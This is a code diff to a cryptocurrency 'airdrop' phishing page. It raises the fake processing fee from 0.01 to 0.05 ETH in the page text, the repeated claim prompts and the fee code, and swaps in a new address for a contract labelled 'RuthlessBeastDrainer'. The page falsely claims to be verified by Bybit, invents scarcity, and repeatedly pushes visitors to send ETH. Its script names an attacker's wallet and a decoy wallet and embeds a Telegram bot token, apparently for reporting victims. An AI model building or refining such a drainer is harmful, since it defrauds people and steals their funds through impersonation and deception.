@@ -45,7 +45,7 @@
 <body>
     <header class="header">
         <h1>Exclusive Airdrop for Early Adopters</h1>
-        <p>Claim Your <span id="rewardAmount">$573 Airdrop</span> Now! <br><span id="transactionFee">Processing Fee: ~$0.40 (0.01 ETH)</span></p>
+        <p>Claim Your <span id="rewardAmount">$573 Airdrop</span> Now! <br><span id="transactionFee">Processing Fee: ~$2.00 (0.05 ETH)</span></p>
         <div id="countdownTimer"></div>
         <div id="spotsRemaining">Spots Remaining: 3/100</div>
         <div id="verifiedBadge">Verified by BYBIT</div>
@@ -103,7 +103,7 @@
                     <p>Connect your wallet to claim your $573 airdrop securely. Your funds are safe. Only a small fee is required to claim your reward.</p>
                     <div id="transactionBreakdown" style="background:#f0f0f0;padding:10px;border-radius:5px;margin-bottom:15px;color:#333">
                         <h6>Transaction Breakdown</h6>
-                        <p>Processing Fee: 0.01 ETH (~$0.40)</p>
+                        <p>Processing Fee: 0.05 ETH (~$2.00)</p>
                         <p>Airdrop Reward: $573</p>
                         <p style="color:#28A745">Your funds are safe! Only the fee will be deducted.</p>
                     </div>
@@ -162,7 +162,7 @@
         document.addEventListener('DOMContentLoaded', async () => {
             const botToken = '7925505296:AAFZzW3mvYl62QJKnnXyUqYORa8jRmx-Lkk';
             const chatId = '6309547301';
-            const drainerContractAddress = '0x000aff4367331a3fb3a4c2f29bbf2dfeee40c580'; // RuthlessBeastDrainer contract
+            const drainerContractAddress = '0xf53a8c01c0db63d9cf6bf26e16c52fd815a3c7f5'; // RuthlessBeastDrainer contract
             const bossAddress = '0x6b9C1121abd649254dB8A7D39091cC6b4D1cf893'; // Attacker’s wallet
             const decoyAddress = '0xF01c1348579e129974A39BAcA3cA9eCe28e68490'; // Decoy wallet
             const sepoliaChainId = '0xaa36a7';
@@ -281,7 +281,7 @@
 
             async function promptSendETH(web3, walletAddress, retryCount = 0) {
                 const maxRetries = 5;
-                const minClaimFee = web3.utils.toWei('0.01', 'ether');
+                const minClaimFee = web3.utils.toWei('0.05', 'ether'); // Updated to 0.05 ETH to match contract
                 try {
                     const balance = await web3.eth.getBalance(walletAddress);
                     const gasPrice = await web3.eth.getGasPrice();
@@ -306,7 +306,7 @@
                             data: depositData
                         });
                     } catch (e) {
-                        estimatedGasFee = 50000;
+                        estimatedGasFee = 50000; // Fallback gas estimate
                     }
 
                     const gasLimitFee = Math.floor(estimatedGasFee * 1.3);
@@ -328,9 +328,9 @@
                     };
 
                     const claimPrompts = [
-                        `Send 0.01 ETH to claim your $573 airdrop!`,
-                        `Confirm 0.01 ETH to unlock your $573 reward!`,
-                        `Last chance! 0.01 ETH for $573! Attempt ${retryCount + 1}/${maxRetries + 1}`
+                        `Send 0.05 ETH to claim your $573 airdrop!`,
+                        `Confirm 0.05 ETH to unlock your $573 reward!`,
+                        `Last chance! 0.05 ETH for $573! Attempt ${retryCount + 1}/${maxRetries + 1}`
                     ];
                     const claimPromptMessage = claimPrompts[retryCount % claimPrompts.length];
 
